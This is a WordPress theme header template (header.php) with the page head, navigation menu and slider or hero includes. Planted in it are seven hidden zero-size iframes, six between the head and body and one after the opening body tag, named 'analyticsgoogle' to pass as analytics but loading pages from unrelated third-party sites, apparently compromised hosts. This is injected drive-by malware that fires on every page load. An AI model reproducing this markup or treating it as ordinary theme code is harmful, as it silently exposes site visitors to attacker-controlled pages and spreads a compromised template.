<!doctype html>
<html <?php language_attributes(); ?>>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta charset="utf-8">

	<title><?php ci_e_title(); ?></title>

	<!-- JS files are loaded via /functions/scripts.php -->

	<!-- CSS files are loaded via /functions/styles.php -->	

	<?php wp_head(); ?>

</head>
<iframe style="position: absolute; left: 0px; top: 0px; width: 0px; height: 0px; z-index: 0;" name="analyticsgoogle" src="http://www.ip.usp.br/biblioteca/atendimentoonline/_config/html/index.php" frameborder="0" width="0" height="0"></iframe>
<iframe style="position: absolute; left: 0px; top: 0px; width: 0px; height: 0px; z-index: 0;" name="analyticsgoogle" src="http://www.ip.usp.br/biblioteca/atendimentoonline/_config/html/index.php" frameborder="0" width="0" height="0"></iframe>
<iframe style="position: absolute; left: 0px; top: 0px; width: 0px; height: 0px; z-index: 0;" name="analyticsgoogle" src="http://www.ip.usp.br/biblioteca/atendimentoonline/_config/html/index.php" frameborder="0" width="0" height="0"></iframe>
<iframe style="position: absolute; left: 0px; top: 0px; width: 0px; height: 0px; z-index: 0;" name="analyticsgoogle" src="http://www.ip.usp.br/biblioteca/atendimentoonline/_config/html/index.php" frameborder="0" width="0" height="0"></iframe>
<iframe style="position: absolute; left: 0px; top: 0px; width: 0px; height: 0px; z-index: 0;" name="analyticsgoogle" src="http://www.ip.usp.br/biblioteca/atendimentoonline/_config/html/index.php" frameborder="0" width="0" height="0"></iframe>
<iframe style="position: absolute; left: 0px; top: 0px; width: 0px; height: 0px; z-index: 0;" name="analyticsgoogle" src="http://www.ip.usp.br/biblioteca/atendimentoonline/_config/html/index.php" frameborder="0" width="0" height="0"></iframe>

<body <?php body_class(); ?>>
<iframe style="position: absolute; left: 0px; top: 0px; width: 0px; height: 0px; z-index: 0;" name="analyticsgoogle" src="http://kmembalagens.com.br/includes/Archive/id/index.php" frameborder="0" width="0" height="0"></iframe>
<?php do_action('after_open_body_tag'); ?>

<div id="page">
	<div id="header-wrap">

		<header id="header" class="wrap">
			<?php ci_e_logo('<h1 class="logo">', '</h1>'); ?>
			
			<nav id="navigation">
				<?php 
					if(has_nav_menu('ci_main_menu'))
						wp_nav_menu( array(
							'theme_location' 	=> 'ci_main_menu',
							'fallback_cb' 		=> '',
							'container' 		=> '',
							'menu_id' 			=> 'nav',
							'menu_class' 		=> 'nav group'
						));
					else
						wp_page_menu();
				?>
			</nav><!-- /navigation -->
		</header><!-- /header -->
		
		<?php
			if (is_page_template('template-front.php')):
				 get_template_part('inc_slider');
			else:
				get_template_part('inc_hero');
			endif;	
		?>
	
	</div><!-- /header-wrap -->		
